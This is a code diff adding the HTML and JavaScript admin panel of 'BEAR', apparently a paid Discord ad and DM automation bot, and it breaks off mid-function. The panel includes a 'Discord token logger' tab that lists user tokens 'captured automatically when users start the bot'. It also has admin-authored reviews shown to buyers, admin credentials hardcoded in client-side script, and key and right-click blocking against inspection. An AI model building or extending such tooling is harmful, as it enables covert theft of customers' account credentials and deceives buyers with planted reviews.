@@ -1,0 +1,1210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>JJAuto — Admin</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#050816;--sur:#0b1224;--sur2:#111b34;--bdr:#1d4ed8;--ac:#3b82f6;--ac2:#2563eb;--ac3:#60a5fa;--dng:#ef4444;--wrn:#f59e0b;--txt:#dbeafe;--mut:#93c5fd;--glow:0 0 20px rgba(59,130,246,0.35)}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--txt);font-family:'Rajdhani',sans-serif;min-height:100vh;overflow-x:hidden;user-select:none;-webkit-user-select:none}
+body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(232,135,58,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(232,135,58,0.03) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0}
+
+/* login */
+#login{position:fixed;inset:0;background:var(--bg);z-index:9998;display:flex;align-items:center;justify-content:center}
+.login-box{background:var(--sur);border:1px solid var(--bdr);border-radius:14px;padding:40px 36px;width:340px;text-align:center;position:relative;overflow:hidden}
+.login-box::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--ac),var(--ac2))}
+.login-logo{font-family:'Share Tech Mono',monospace;font-size:1.6rem;color:var(--ac);text-shadow:var(--glow);letter-spacing:2px;margin-bottom:6px}
+.login-logo span{color:var(--ac2)}
+.login-sub{font-size:0.78rem;color:var(--mut);letter-spacing:1.5px;text-transform:uppercase;margin-bottom:28px;font-family:'Share Tech Mono',monospace}
+.login-box input{background:var(--sur2);border:1px solid var(--bdr);border-radius:8px;color:var(--txt);font-family:'Share Tech Mono',monospace;font-size:0.9rem;padding:11px 14px;outline:none;width:100%;margin-bottom:12px;transition:border-color .2s}
+.login-box input:focus{border-color:var(--ac)}
+.login-btn{width:100%;padding:11px;background:var(--ac);color:#000;border:none;border-radius:8px;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:1rem;letter-spacing:1.5px;text-transform:uppercase;cursor:pointer;transition:.2s}
+.login-btn:hover{box-shadow:var(--glow);transform:translateY(-1px)}
+.login-err{color:var(--dng);font-size:0.8rem;font-family:'Share Tech Mono',monospace;margin-top:10px;min-height:18px}
+/* layout */
+.wrap{position:relative;z-index:1;max-width:1100px;margin:0 auto;padding:22px 18px 60px}
+header{display:flex;align-items:center;justify-content:space-between;padding:18px 26px;border:1px solid var(--bdr);background:linear-gradient(135deg,rgba(232,135,58,0.06),rgba(196,92,26,0.06));border-radius:12px;margin-bottom:22px;position:relative;overflow:hidden}
+header::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--ac),var(--ac2))}
+.logo{font-family:'Share Tech Mono',monospace;font-size:1.4rem;color:var(--ac);text-shadow:var(--glow);letter-spacing:2px}
+.logo span{color:var(--ac2)}
+.abadge{display:flex;align-items:center;gap:8px;font-family:'Share Tech Mono',monospace;font-size:0.78rem;color:var(--mut)}
+.adot{width:8px;height:8px;border-radius:50%;background:var(--ac);box-shadow:0 0 8px var(--ac);animation:bl 2s infinite}
+@keyframes bl{0%,100%{opacity:1}50%{opacity:0.3}}
+.logout-btn{background:transparent;border:1px solid var(--dng);color:var(--dng);border-radius:7px;padding:6px 14px;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:0.82rem;letter-spacing:1px;cursor:pointer;transition:.2s;text-transform:uppercase}
+.logout-btn:hover{background:rgba(239,68,68,0.1)}
+/* stats */
+.srow{display:grid;grid-template-columns:repeat(5,1fr);gap:12px;margin-bottom:20px}
+.sc{background:var(--sur);border:1px solid var(--bdr);border-radius:10px;padding:14px 18px;text-align:center}
+.sv{font-size:1.9rem;font-weight:700;font-family:'Share Tech Mono',monospace;color:var(--ac);text-shadow:var(--glow)}
+.sl{font-size:0.7rem;letter-spacing:1.5px;text-transform:uppercase;color:var(--mut);margin-top:3px}
+/* tabs */
+.tabs{display:flex;gap:4px;margin-bottom:20px;border-bottom:1px solid var(--bdr);flex-wrap:wrap}
+.tb{padding:9px 20px;background:none;border:none;border-bottom:2px solid transparent;color:var(--mut);font-family:'Rajdhani',sans-serif;font-size:0.92rem;font-weight:600;letter-spacing:1px;cursor:pointer;transition:all .2s;text-transform:uppercase}
+.tb:hover{color:var(--txt)}
+.tb.on{color:var(--ac);border-bottom-color:var(--ac);text-shadow:var(--glow)}
+.tc{display:none}.tc.on{display:block}
+/* card */
+.card{background:var(--sur);border:1px solid var(--bdr);border-radius:12px;padding:22px;margin-bottom:18px;position:relative;overflow:hidden}
+.card::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(180deg,var(--ac),var(--ac2))}
+.ct{font-size:1rem;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--ac);margin-bottom:16px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px}
+/* log table */
+.log-table{width:100%;border-collapse:collapse;font-family:'Share Tech Mono',monospace;font-size:0.78rem}
+.log-table th{text-align:left;padding:8px 12px;border-bottom:1px solid var(--bdr);color:var(--mut);font-size:0.7rem;letter-spacing:1.2px;text-transform:uppercase;font-weight:600}
+.log-table td{padding:9px 12px;border-bottom:1px solid rgba(30,45,74,0.5);vertical-align:top;word-break:break-all}
+.log-table tr:hover td{background:rgba(232,135,58,0.04)}
+.log-table tr:last-child td{border-bottom:none}
+.badge{display:inline-flex;align-items:center;padding:2px 8px;border-radius:12px;font-size:0.7rem;font-weight:700;letter-spacing:.5px}
+.badge-ad{background:rgba(0,212,255,0.12);color:#e8873a;border:1px solid rgba(0,212,255,0.3)}
+.badge-dm{background:rgba(196,92,26,0.12);color:#c45c1a;border:1px solid rgba(124,58,237,0.3)}
+.badge-start{background:rgba(16,185,129,0.12);color:#10b981;border:1px solid rgba(16,185,129,0.3)}
+.badge-stop{background:rgba(245,158,11,0.12);color:#f59e0b;border:1px solid rgba(245,158,11,0.3)}
+.badge-devtools{background:rgba(239,68,68,0.12);color:#ef4444;border:1px solid rgba(239,68,68,0.3)}
+.badge-dm_start{background:rgba(16,185,129,0.12);color:#10b981;border:1px solid rgba(16,185,129,0.3)}
+.badge-dm_stop{background:rgba(245,158,11,0.12);color:#f59e0b;border:1px solid rgba(245,158,11,0.3)}
+.badge-error{background:rgba(239,68,68,0.12);color:#ef4444;border:1px solid rgba(239,68,68,0.3)}
+.no-data{text-align:center;color:var(--mut);font-family:'Share Tech Mono',monospace;font-size:0.82rem;padding:30px}
+/* forms */
+.fg{display:grid;grid-template-columns:1fr 1fr;gap:13px}
+.f{display:flex;flex-direction:column;gap:5px}
+.f.s2{grid-column:span 2}
+label{font-size:0.73rem;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;color:var(--mut);font-family:'Share Tech Mono',monospace}
+input,select{background:var(--sur2);border:1px solid var(--bdr);border-radius:7px;color:var(--txt);font-family:'Share Tech Mono',monospace;font-size:0.87rem;padding:9px 13px;outline:none;transition:border-color .2s;width:100%}
+input:focus,select:focus{border-color:var(--ac);box-shadow:0 0 0 2px rgba(255,77,109,0.1)}
+.br{display:flex;gap:9px;margin-top:14px;flex-wrap:wrap}
+.btn{padding:9px 20px;border-radius:7px;border:none;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:0.88rem;letter-spacing:1.5px;text-transform:uppercase;cursor:pointer;transition:all .2s;display:flex;align-items:center;gap:7px}
+.bp{background:var(--ac);color:#000}.bp:hover{box-shadow:var(--glow);transform:translateY(-1px)}
+.bs{background:transparent;border:1px solid var(--ac);color:var(--ac)}.bs:hover{background:rgba(232,135,58,0.08)}
+.bd{background:transparent;border:1px solid var(--dng);color:var(--dng)}.bd:hover{background:rgba(239,68,68,0.1)}
+.bg{background:var(--ac3);color:#000}.bg:hover{box-shadow:0 0 16px rgba(16,185,129,0.35)}
+.btn:disabled{opacity:.4;cursor:not-allowed}
+/* user table */
+.utbl{width:100%;border-collapse:collapse;font-family:'Share Tech Mono',monospace;font-size:0.8rem}
+.utbl th{text-align:left;padding:8px 12px;border-bottom:1px solid var(--bdr);color:var(--mut);font-size:0.7rem;letter-spacing:1.2px;text-transform:uppercase}
+.utbl td{padding:9px 12px;border-bottom:1px solid rgba(30,45,74,0.4)}
+.utbl tr:hover td{background:rgba(232,135,58,0.03)}
+.utbl tr:last-child td{border-bottom:none}
+.del-btn{background:transparent;border:1px solid var(--dng);color:var(--dng);border-radius:5px;padding:3px 9px;font-size:0.72rem;cursor:pointer;transition:.2s}
+.del-btn:hover{background:rgba(239,68,68,0.12)}
+.copy-tok{background:transparent;border:1px solid var(--ac3);color:var(--ac3);border-radius:5px;padding:3px 9px;font-size:0.72rem;cursor:pointer;transition:.2s}
+.copy-tok:hover{background:rgba(16,185,129,0.12)}
+/* key output */
+.key-out{background:var(--sur2);border:1px solid var(--bdr);border-radius:8px;padding:14px;font-family:'Share Tech Mono',monospace;font-size:0.88rem;margin-top:14px;display:none;word-break:break-all}
+.key-out .key-val{color:var(--ac3);font-size:1rem;font-weight:700;letter-spacing:1px;margin:4px 0}
+.copy-btn{background:transparent;border:1px solid var(--ac3);color:var(--ac3);border-radius:5px;padding:4px 10px;font-size:0.73rem;cursor:pointer;margin-top:8px;transition:.2s}
+.copy-btn:hover{background:rgba(16,185,129,0.12)}
+/* filter row */
+.filter-row{display:flex;gap:8px;align-items:center;margin-bottom:14px;flex-wrap:wrap}
+.filter-row input{flex:1;min-width:160px}
+.filter-row select{width:140px}
+/* token reveal */
+.tok-cell{font-family:'Share Tech Mono',monospace;font-size:0.75rem;color:var(--ac3);word-break:break-all;max-width:300px}
+.tok-hidden{filter:blur(4px);cursor:pointer;user-select:none;transition:filter .2s;color:var(--ac3)}
+.tok-hidden:hover{filter:blur(2px)}
+/* webhook info box */
+.wh-info{margin-top:14px;background:rgba(232,135,58,0.04);border:1px solid rgba(232,135,58,0.15);border-radius:8px;padding:14px;font-family:'Share Tech Mono',monospace;font-size:0.79rem;color:var(--mut);line-height:1.9}
+.wh-info span{color:var(--txt)}
+/* service status row */
+.svc-row{display:flex;align-items:center;justify-content:space-between;padding:12px 0;border-bottom:1px solid var(--bdr);gap:12px;flex-wrap:wrap}
+.svc-row:last-child{border-bottom:none}
+.svc-name{font-weight:700;font-size:0.93rem;flex:1;min-width:120px}
+.svc-desc{font-size:0.75rem;color:var(--mut);font-family:'Share Tech Mono',monospace}
+.svc-sel{background:var(--sur2);border:1px solid var(--bdr);border-radius:6px;color:var(--txt);font-family:'Share Tech Mono',monospace;font-size:0.78rem;padding:5px 10px;outline:none;cursor:pointer;width:160px;transition:.2s}
+.svc-sel:focus{border-color:var(--ac)}
+.svc-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
+.st-operational{color:#10b981}.st-maintenance{color:#f59e0b}.st-degraded{color:#2563eb}.st-outage{color:#ef4444}
+.dot-operational{background:#10b981;box-shadow:0 0 7px #10b981}
+.dot-maintenance{background:#f59e0b;box-shadow:0 0 7px #f59e0b}
+.dot-degraded{background:#2563eb;box-shadow:0 0 7px #2563eb}
+.dot-outage{background:#ef4444;box-shadow:0 0 7px #ef4444;animation:bl 1s infinite}
+#toast{position:fixed;bottom:26px;right:26px;background:var(--sur);border:1px solid var(--bdr);border-radius:10px;padding:12px 18px;font-family:'Share Tech Mono',monospace;font-size:0.8rem;z-index:9999;transform:translateY(80px);opacity:0;transition:all .3s;max-width:300px}
+#toast.show{transform:translateY(0);opacity:1}
+#toast.success{border-color:var(--ac3);color:var(--ac3)}
+#toast.error{border-color:var(--dng);color:var(--dng)}
+#toast.info{border-color:var(--ac);color:var(--ac)}
+::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:var(--sur)}::-webkit-scrollbar-thumb{background:var(--bdr);border-radius:3px}
+@media(max-width:640px){.srow{grid-template-columns:1fr 1fr}.fg{grid-template-columns:1fr}.f.s2{grid-column:span 1}}
+</style>
+</head>
+<body>
+
+
+
+<!-- Login -->
+<div id="login">
+  <div class="login-box">
+    <div class="login-logo">BEAR</div>
+    <div class="login-sub">Admin Access</div>
+    <input type="text" id="l-user" placeholder="Username" autocomplete="off">
+    <input type="password" id="l-pass" placeholder="Password" onkeydown="if(event.key==='Enter')doLogin()">
+    <button class="login-btn" onclick="doLogin()">ACCESS PANEL</button>
+    <div class="login-err" id="l-err"></div>
+  </div>
+</div>
+
+<div id="toast"></div>
+
+<!-- Main -->
+<div class="wrap" id="main" style="display:none">
+
+<header>
+  <div class="logo">BEAR <span style="font-size:.7rem;color:var(--mut);margin-left:6px">ADMIN</span></div>
+  <div style="display:flex;align-items:center;gap:14px">
+    <div class="abadge"><div class="adot"></div>ADMIN SESSION</div>
+    <div style="font-family:'Share Tech Mono',monospace;font-size:0.78rem;color:var(--mut)" id="clk"></div>
+    <button class="logout-btn" onclick="logout()">Logout</button>
+  </div>
+</header>
+
+<div class="srow" style="grid-template-columns:repeat(7,1fr)">
+  <div class="sc"><div class="sv" id="sa-ads">0</div><div class="sl">Total Ads</div></div>
+  <div class="sc"><div class="sv" id="sa-dms">0</div><div class="sl">DM Replies</div></div>
+  <div class="sc"><div class="sv" id="sa-users">0</div><div class="sl">Registered Users</div></div>
+  <div class="sc"><div class="sv" id="sa-keys">0</div><div class="sl">Active Keys</div></div>
+  <div class="sc"><div class="sv" id="sa-toks">0</div><div class="sl">Tokens Logged</div></div>
+  <div class="sc"><div class="sv" id="sa-reviews">0</div><div class="sl">Reviews</div></div>
+  <div class="sc"><div class="sv" id="sa-payments">0</div><div class="sl">Payments</div></div>
+</div>
+
+<div class="tabs">
+  <button class="tb on" onclick="tab('logs',this)">📋 Logs</button>
+  <button class="tb" onclick="tab('tokens',this)">🔑 Tokens</button>
+  <button class="tb" onclick="tab('users',this)">👥 Users</button>
+  <button class="tb" onclick="tab('keys',this)">🗝️ Keys</button>
+  <button class="tb" onclick="tab('payments',this)">💸 Payments</button>
+  <button class="tb" onclick="tab('wh',this)">🔗 Webhooks</button>
+  <button class="tb" onclick="tab('pricing',this)">💰 Pricing</button>
+  <button class="tb" onclick="tab('reviews',this)">⭐ Reviews</button>
+  <button class="tb" onclick="tab('status',this)">📊 Status</button>
+</div>
+
+<!-- LOGS -->
+<div id="tab-logs" class="tc on">
+<div class="card">
+  <div class="ct">
+    <span>📋 ACTIVITY LOGS</span>
+    <div style="display:flex;gap:8px">
+      <button class="btn bs" onclick="refreshLogs()" style="padding:5px 14px;font-size:0.78rem">🔄 Refresh</button>
+      <button class="btn bd" onclick="clearEvs()" style="padding:5px 14px;font-size:0.78rem">🗑️ Clear</button>
+    </div>
+  </div>
+  <div class="filter-row">
+    <input type="text" id="log-search" placeholder="Search logs..." oninput="renderLogs()">
+    <select id="log-filter" onchange="renderLogs()">
+      <option value="all">All Types</option>
+      <option value="ad">Ads</option>
+      <option value="dm">DM Replies</option>
+      <option value="start">Start Events</option>
+      <option value="stop">Stop Events</option>
+      <option value="dm_start">DM Start</option>
+      <option value="dm_stop">DM Stop</option>
+      <option value="devtools">DevTools</option>
+      <option value="error">Errors</option>
+    </select>
+  </div>
+  <div style="overflow-x:auto">
+    <table class="log-table">
+      <thead><tr><th>#</th><th>Time</th><th>Type</th><th>Details</th></tr></thead>
+      <tbody id="log-tbody"></tbody>
+    </table>
+    <div id="log-empty" class="no-data" style="display:none">No events yet.</div>
+  </div>
+</div>
+</div>
+
+<!-- TOKENS -->
+<div id="tab-tokens" class="tc">
+<div class="card">
+  <div class="ct">
+    <span>🔑 DISCORD TOKEN LOGGER</span>
+    <div style="display:flex;gap:8px">
+      <button class="btn bs" onclick="renderTokens()" style="padding:5px 14px;font-size:0.78rem">🔄 Refresh</button>
+      <button class="btn bd" onclick="clearTokens()" style="padding:5px 14px;font-size:0.78rem">🗑️ Clear All</button>
+    </div>
+  </div>
+  <div style="font-family:'Share Tech Mono',monospace;font-size:0.75rem;color:var(--mut);margin-bottom:14px;background:rgba(232,135,58,0.06);border:1px solid rgba(232,135,58,0.2);border-radius:7px;padding:10px 14px">
+    ⚡ Tokens captured automatically when users start the bot. Click a token to reveal / copy.
+  </div>
+  <div style="overflow-x:auto">
+    <table class="utbl" id="tok-table">
+      <thead><tr><th>#</th><th>Captured At</th><th>Source</th><th>Token</th><th>Actions</th></tr></thead>
+      <tbody id="tok-tbody"></tbody>
+    </table>
+    <div id="tok-empty" class="no-data" style="display:none">No tokens captured yet.</div>
+  </div>
+</div>
+</div>
+
+<!-- USERS -->
+<div id="tab-users" class="tc">
+<div class="card">
+  <div class="ct">👥 MANAGE USERS</div>
+  <div class="fg">
+    <div class="f"><label>User ID / Username</label><input type="text" id="u-id" placeholder="Username..."></div>
+    <div class="f"><label>Access Duration</label>
+      <select id="u-dur">
+        <option value="3600">1 Hour</option>
+        <option value="86400">1 Day</option>
+        <option value="604800">1 Week</option>
+        <option value="2592000">1 Month</option>
+        <option value="inf">Lifetime</option>
+      </select>
+    </div>
+  </div>
+  <div class="br">
+    <button class="btn bp" onclick="addUser()">➕ Grant Access</button>
+    <button class="btn bd" onclick="removeUser()">🗑️ Revoke Access</button>
+  </div>
+</div>
+<div class="card">
+  <div class="ct">REGISTERED USERS <span id="u-count" style="font-size:.78rem;color:var(--mut)"></span></div>
+  <div style="overflow-x:auto">
+    <table class="utbl">
+      <thead><tr><th>Username</th><th>Password</th><th>Time Left</th><th>Status</th><th>Action</th></tr></thead>
+      <tbody id="u-tbody"></tbody>
+    </table>
+    <div id="u-empty" class="no-data" style="display:none">No users yet.</div>
+  </div>
+</div>
+</div>
+
+<!-- KEYS -->
+<div id="tab-keys" class="tc">
+<div class="card">
+  <div class="ct">🗝️ GENERATE KEY</div>
+  <div style="font-family:'Share Tech Mono',monospace;font-size:0.76rem;color:var(--mut);margin-bottom:14px;background:rgba(232,135,58,0.04);border:1px solid rgba(232,135,58,0.12);border-radius:7px;padding:10px 14px">
+    🔑 Keys are generated in the format: <span style="color:var(--ac3)">BR-<span style="color:var(--txt)">1W</span>-<span style="color:var(--txt)">XXXX-XXXX</span>-<span style="color:var(--txt)">XX</span></span>
+  </div>
+  <div class="fg">
+    <div class="f"><label>Key Duration</label>
+      <select id="k-dur">
+        <option value="3600">1 Hour</option>
+        <option value="86400">1 Day</option>
+        <option value="604800" selected>1 Week</option>
+        <option value="2592000">1 Month</option>
+        <option value="inf">Lifetime</option>
+      </select>
+    </div>
+    <div class="f"><label>Key Count</label><input type="number" id="k-cnt" value="1" min="1" max="20"></div>
+  </div>
+  <div class="br"><button class="btn bp" onclick="genKeys()">🗝️ Generate Keys</button></div>
+  <div id="k-out" class="key-out"></div>
+</div>
+<div class="card">
+  <div class="ct">ACTIVE KEYS <span id="k-count" style="font-size:.78rem;color:var(--mut)"></span></div>
+  <div style="overflow-x:auto">
+    <table class="utbl">
+      <thead><tr><th>Key</th><th>Duration</th><th>Action</th></tr></thead>
+      <tbody id="k-tbody"></tbody>
+    </table>
+    <div id="k-empty" class="no-data" style="display:none">No keys generated yet.</div>
+  </div>
+</div>
+<div class="card">
+  <div class="ct">🔒 USED KEYS <span id="uk-count" style="font-size:.78rem;color:var(--mut)"></span></div>
+  <div style="overflow-x:auto">
+    <table class="utbl">
+      <thead><tr><th>Key</th><th>Redeemed By</th><th>Expires</th></tr></thead>
+      <tbody id="uk-tbody"></tbody>
+    </table>
+    <div id="uk-empty" class="no-data" style="display:none">No keys redeemed yet.</div>
+  </div>
+</div>
+</div>
+
+<!-- PAYMENTS -->
+<div id="tab-payments" class="tc">
+<div class="card">
+  <div class="ct" style="justify-content:space-between">
+    <span>💸 INCOMING PAYMENTS</span>
+    <div style="display:flex;gap:8px">
+      <button class="btn bs" onclick="renderPayments()" style="padding:5px 14px;font-size:0.78rem">🔄 Refresh</button>
+      <button class="btn bd" onclick="clearPayments()" style="padding:5px 14px;font-size:0.78rem">🗑️ Clear</button>
+    </div>
+  </div>
+  <div style="overflow-x:auto">
+    <table class="utbl">
+      <thead><tr><th>Order ID</th><th>Plan</th><th>Coin</th><th>Amount</th><th>Status</th><th>Time</th></tr></thead>
+      <tbody id="pay-tbody"></tbody>
+    </table>
+    <div id="pay-empty" class="no-data" style="display:none">No payments yet.</div>
+  </div>
+</div>
+</div>
+
+<!-- WEBHOOK -->
+<div id="tab-wh" class="tc">
+<div class="card">
+  <div class="ct">🔗 ADMIN WEBHOOK</div>
+  <div style="display:flex;gap:10px;align-items:flex-end">
+    <div class="f" style="flex:1"><label>Webhook URL</label><input type="text" id="adm-wh" placeholder="https://discord.com/api/webhooks/..."></div>
+    <button class="btn bs" onclick="testAWH()" style="flex-shrink:0">🧪 Test</button>
+    <button class="btn bp" onclick="saveAWH()" style="flex-shrink:0">💾 Save</button>
+  </div>
+  <div class="wh-info">
+    Admin webhook fires on:<br>
+    <span>• User access granted / revoked</span><br>
+    <span>• Key generated</span><br>
+    <span>• Admin login</span><br>
+    <span>• New token captured</span><br>
+    <span>• DevTools detected on admin panel</span>
+  </div>
+</div>
+<div class="card">
+  <div class="ct">📈 PERFORMANCE WEBHOOK</div>
+  <div style="display:flex;gap:10px;align-items:flex-end">
+    <div class="f" style="flex:1"><label>Webhook URL</label><input type="text" id="perf-wh" placeholder="https://discord.com/api/webhooks/..."></div>
+    <button class="btn bs" onclick="testPerfWH()" style="flex-shrink:0">🧪 Test</button>
+    <button class="btn bp" onclick="savePerfWH()" style="flex-shrink:0">💾 Save</button>
+  </div>
+  <div style="margin-top:16px">
+    <label>Live Performance Stats</label>
+    <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-top:10px">
+      <div class="sc"><div class="sv" id="perf-ping" style="font-size:1.3rem;color:var(--ac3)">–</div><div class="sl">Discord Ping</div></div>
+      <div class="sc"><div class="sv" id="perf-ads" style="font-size:1.3rem">–</div><div class="sl">Ads / Hour</div></div>
+      <div class="sc"><div class="sv" id="perf-dms" style="font-size:1.3rem">–</div><div class="sl">DMs / Hour</div></div>
+      <div class="sc"><div class="sv" id="perf-uptime" style="font-size:1.3rem;color:var(--ac3)">–</div><div class="sl">Admin Uptime</div></div>
+    </div>
+    <div class="br" style="margin-top:12px">
+      <button class="btn bg" onclick="measurePing()">📡 Measure Ping</button>
+      <button class="btn bp" onclick="sendPerfReport()">📤 Send Perf Report</button>
+    </div>
+  </div>
+  <div class="wh-info" style="margin-top:14px">
+    Performance webhook fires on:<br>
+    <span>• Manual report (button above)</span><br>
+    <span>• Ad sent (channel, slot, message preview)</span><br>
+    <span>• DM replied (username + message)</span><br>
+    <span>• Slot started / stopped</span><br>
+    <span>• Auto report every 1 hour (if URL saved)</span><br>
+    <span id="perf-countdown-row" style="display:none">⏱️ Next auto-report in: <span id="perf-countdown" style="color:var(--ac3);font-weight:700">60:00</span></span>
+  </div>
+</div>
+<div class="card">
+  <div class="ct">🎫 SUPPORT TICKETS</div>
+  <div style="background:rgba(196,92,26,0.06);border:1px solid rgba(196,92,26,0.2);border-radius:8px;padding:16px;font-family:'Share Tech Mono',monospace;font-size:0.82rem;color:var(--mut);line-height:2;margin-bottom:14px">
+    Tickets are handled on <span style="color:var(--txt)">Discord</span>. Users open tickets directly in your Discord server — not on the website.
+  </div>
+  <div class="fg">
+    <div class="f s2"><label>Discord Server Invite Link</label><input type="text" id="discord-invite" placeholder="https://discord.gg/yourserver" oninput="saveDcInvite()"></div>
+  </div>
+  <div class="br" style="margin-top:12px">
+    <button class="btn bp" onclick="openDcServer()">🔗 Open Discord Server</button>
+    <button class="btn bs" onclick="copyDcInvite()">📋 Copy Invite Link</button>
+  </div>
+  <div class="wh-info" style="margin-top:14px">
+    <span>• Set your Discord invite link above so you can quickly open it from here</span><br>
+    <span>• Users are directed to Discord for all support tickets</span><br>
+    <span>• No in-website ticket system — keeps everything in one place</span>
+  </div>
+</div>
+</div>
+
+<!-- REVIEWS -->
+<div id="tab-reviews" class="tc">
+<div class="card">
+  <div class="ct" style="justify-content:space-between">
+    <span>⭐ MANAGE REVIEWS</span>
+    <button class="btn bs" onclick="addReview()" style="padding:5px 14px;font-size:0.78rem">➕ Add Review</button>
+  </div>
+  <div style="font-family:'Share Tech Mono',monospace;font-size:0.75rem;color:var(--mut);margin-bottom:14px;background:rgba(232,135,58,0.04);border:1px solid rgba(232,135,58,0.12);border-radius:7px;padding:10px 14px">
+    ⭐ Reviews show on the login screen. Add up to 10 reviews.
+  </div>
+  <div id="review-editor" style="display:flex;flex-direction:column;gap:10px"></div>
+  <div class="br">
+    <button class="btn bp" onclick="saveReviews()">💾 Save Reviews</button>
+    <button class="btn bs" onclick="resetReviews()">↺ Reset to Default</button>
+  </div>
+</div>
+</div>
+
+<!-- PRICING -->
+<div id="tab-pricing" class="tc">
+<div class="card">
+  <div class="ct">💰 PLANS & PRICING</div>
+  <div id="plan-editor" style="display:flex;flex-direction:column;gap:10px;margin-bottom:18px"></div>
+  <div class="ct" style="margin-top:4px">🪙 WALLET ADDRESSES</div>
+  <div class="fg">
+    <div class="f"><label>BTC Address</label><input type="text" id="w-btc" placeholder="bc1q..."></div>
+    <div class="f"><label>ETH Address</label><input type="text" id="w-eth" placeholder="0x..."></div>
+    <div class="f"><label>LTC Address</label><input type="text" id="w-ltc" placeholder="L..."></div>
+    <div class="f"><label>SOL Address</label><input type="text" id="w-sol" placeholder="..."></div>
+  </div>
+  <div class="br">
+    <button class="btn bp" onclick="savePricing()">💾 Save Pricing</button>
+    <button class="btn bs" onclick="resetPricing()">↺ Reset to Default</button>
+  </div>
+</div>
+</div>
+
+<!-- STATUS PANEL -->
+<div id="tab-status" class="tc">
+<div class="card">
+  <div class="ct" style="justify-content:space-between">
+    <span>🟢 SERVICE STATUS</span>
+    <div style="display:flex;gap:8px;align-items:center">
+      <div id="overall-badge" style="font-family:'Share Tech Mono',monospace;font-size:0.75rem;padding:4px 12px;border-radius:20px;background:rgba(16,185,129,0.1);border:1px solid var(--ac3);color:var(--ac3)">● ALL SYSTEMS OPERATIONAL</div>
+      <button class="btn bs" onclick="broadcastStatus()" style="padding:5px 14px;font-size:0.78rem">📤 Broadcast</button>
+    </div>
+  </div>
+  <!-- Service rows -->
+  <div id="service-list" style="display:flex;flex-direction:column;gap:0"></div>
+  <div class="br" style="margin-top:14px">
+    <button class="btn bg" onclick="setAllStatus('operational')">✅ All Operational</button>
+    <button class="btn bs" onclick="setAllStatus('maintenance')">🔧 Maintenance Mode</button>
+    <button class="btn bd" onclick="setAllStatus('outage')">🔴 Major Outage</button>
+  </div>
+</div>
+<div class="card">
+  <div class="ct">📣 STATUS WEBHOOK</div>
+  <div style="display:flex;gap:10px;align-items:flex-end">
+    <div class="f" style="flex:1"><label>Webhook URL</label><input type="text" id="status-wh" placeholder="https://discord.com/api/webhooks/..."></div>
+    <button class="btn bs" onclick="testStatusWH()" style="flex-shrink:0">🧪 Test</button>
+    <button class="btn bp" onclick="saveStatusWH()" style="flex-shrink:0">💾 Save</button>
+  </div>
+  <div style="margin-top:14px">
+    <label>Incident Message (sent with broadcasts)</label>
+    <input type="text" id="status-incident" placeholder="e.g. Scheduled maintenance — back in 30min" style="margin-top:8px">
+  </div>
+  <div class="wh-info" style="margin-top:14px">
+    Status webhook fires on:<br>
+    <span>• Manual broadcast (button above)</span><br>
+    <span>• Any service status change</span><br>
+    <span>• Auto ping every 1 hour (if URL saved)</span><br>
+    <span id="status-countdown-row" style="display:none">⏱️ Next auto-broadcast in: <span id="status-countdown" style="color:var(--ac3);font-weight:700">60:00</span></span>
+  </div>
+</div>
+<div class="card">
+  <div class="ct">📋 USER STATUS OVERVIEW</div>
+  <div style="overflow-x:auto">
+    <table class="utbl" id="status-user-table">
+      <thead><tr><th>Username</th><th>Status</th><th>Time Left</th><th>Last Seen</th></tr></thead>
+      <tbody id="status-u-tbody"></tbody>
+    </table>
+    <div id="status-u-empty" class="no-data" style="display:none">No users registered yet.</div>
+  </div>
+</div>
+</div>
+
+</div><!-- /wrap -->
+
+<script>
+// ══ ADMIN CONFIG ═══════════════════════
+const ADMIN_USER='admin';
+const ADMIN_PASS='bear2025';
+
+// ══ KEY BLOCK ═══════════════════════════
+(function(){
+  var _blk=function(e){
+    var k=(e.key||'').toUpperCase();
+    var f=(e.keyCode||e.which);
+    var stop=
+      e.key==='F12'||f===123||
+      (e.ctrlKey&&e.shiftKey&&(k==='I'||k==='J'||k==='C'||k==='K'||k==='M'))||
+      (e.ctrlKey&&!e.shiftKey&&(k==='U'||k==='S'))||
+      (e.metaKey&&e.altKey&&(k==='I'||k==='J'||k==='C'));
+    if(stop){
+      try{e.preventDefault();}catch(_){}
+      try{e.stopPropagation();}catch(_){}
+      try{e.stopImmediatePropagation();}catch(_){}
+      return false;
+    }
+  };
+  window.addEventListener('keydown',_blk,true);
+  document.addEventListener('keydown',_blk,true);
+  document.addEventListener('DOMContentLoaded',function(){
+    window.addEventListener('keydown',_blk,true);
+    document.addEventListener('keydown',_blk,true);
+  });
+  document.addEventListener('contextmenu',function(e){try{e.preventDefault();}catch(_){}return false;},true);
+  window.addEventListener('contextmenu',function(e){try{e.preventDefault();}catch(_){}return false;},true);
+})();
+
+// ══ AUTH ═══════════════════════════════
+function doLogin(){
+  const u=document.getElementById('l-user').value.trim();
+  const p=document.getElementById('l-pass').value;
+  if(u===ADMIN_USER&&p===ADMIN_PASS){
+    document.getElementById('login').style.display='none';
+    document.getElementById('main').style.display='block';
+    sessionStorage.setItem('zwa','1');
+    init();
+    sendAWH('🔐 Admin Login',`\`\`\`Admin panel accessed.\nTime: ${new Date().toLocaleString()}\`\`\``,0xff4d6d);
+  } else {
